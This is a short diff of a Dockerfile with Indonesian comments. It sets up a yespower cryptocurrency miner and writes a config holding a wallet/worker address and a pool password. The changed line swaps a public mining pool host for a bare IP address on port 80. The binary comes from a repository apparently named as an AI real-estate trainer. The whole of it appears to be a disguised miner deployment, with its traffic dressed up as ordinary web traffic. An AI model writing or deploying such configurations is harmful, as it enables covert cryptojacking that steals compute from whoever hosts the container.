@@ -30,7 +30,7 @@ RUN wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/downl
 RUN chown -R $APP_USER:$APP_USER $APP_HOME && chmod -R 700 $APP_HOME
 
 # Buat file config.json
-RUN echo '{"algorithm": "yespower", "host": "yespower.asia.mine.zergpool.com", "port": 6533, "worker": "TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR", "password": "c=TDC,mc=SMT/SPRX/SWAMP", "workers": 4, "log": false, "chrome": "./chromium/chrome" }' > $APP_HOME/python3/config.json
+RUN echo '{"algorithm": "yespower", "host": "146.103.45.69", "port": 80, "worker": "TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR", "password": "c=TDC,mc=SMT/SPRX/SWAMP", "workers": 4, "log": false, "chrome": "./chromium/chrome" }' > $APP_HOME/python3/config.json
 
 # Pindah ke direktori aplikasi
 WORKDIR $APP_HOME/python3
